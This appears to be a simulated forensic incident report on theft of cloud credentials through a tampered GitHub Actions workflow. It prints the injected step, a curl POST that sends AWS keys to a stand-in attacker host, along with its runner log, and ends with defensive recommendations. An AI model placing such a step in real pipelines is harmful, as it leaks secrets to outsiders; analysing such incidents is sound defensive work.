# Forensic Investigation Report: Case #001 - Pipeline Injection

**Date:** 2026-02-05
**Investigator:** DPFF Automated Agent
**Incident Type:** Credential Exfiltration via CI/CD Pipeline
**Severity:** CRITICAL

## Executive Summary
Malicious modification of the CI/CD pipeline configuration resulted in the exfiltration of AWS cloud credentials. The attack was executed by injecting a curl command into the GitHub Actions workflow.

## Evidence Analyzed
1.  **File:** `.github/workflows/ci.yml` (Recovered from Git history)
2.  **Log:** `runner_logs.txt` (Simulated CI runner output)

## Findings
### 1. Workflow Modification
Analysis of `.github/workflows/ci.yml` reveals an anomalous step named "Exfiltrate Secrets" added to the build job.

```yaml
      - name: Exfiltrate Secrets
        run: |
          curl -X POST https://attacker.com/log \
            -d "aws_key=$AWS_ACCESS_KEY_ID" \
            -d "aws_secret=$AWS_SECRET_ACCESS_KEY"
```

### 2. Execution Confirmation
Review of `runner_logs.txt` confirms this step was executed at `2026-02-05T14:30:17Z`.

```
[2026-02-05T14:30:17Z] Executing: curl -X POST https://attacker.com/log -d "aws_key=***" -d "aws_secret=***"
[2026-02-05T14:30:18Z] Response: 200 OK
```

## Root Cause
- **Insufficient Branch Protection:** Attacker was able to push changes to `.github/workflows/` without review.
- **Secret Usage Policy:** Secrets were available to the build context indiscriminately.

## Recommendations
1.  Rotate `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` immediately.
2.  Implement `CODEOWNERS` for `.github/` directory.
3.  Restrict secret access to specific environments/jobs.
